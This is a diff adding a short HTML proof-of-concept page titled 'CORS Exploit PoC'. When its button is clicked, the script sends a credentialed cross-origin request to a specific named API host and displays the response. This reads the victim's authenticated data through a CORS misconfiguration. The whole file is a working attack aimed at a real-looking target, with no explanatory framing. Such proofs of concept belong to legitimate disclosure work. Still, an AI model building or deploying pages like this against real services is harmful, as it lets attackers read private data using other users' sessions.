@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit PoC</h1>
+    <button id="exploit">Exploit CORS</button>
+    <pre id="output"></pre>
+
+    <script>
+        document.getElementById('exploit').onclick = function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://vera-devel.api.verily.com/', true);
+            xhr.withCredentials = true; // Include credentials (cookies, etc.)
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4) {
+                    if (xhr.status == 200) {
+                        document.getElementById('output').innerText = xhr.responseText;
+                    } else {
+                        document.getElementById('output').innerText = 'Error: ' + xhr.status;
+                    }
+                }
+            };
+            xhr.send();
+        };
+    </script>
+</body>
+</html>
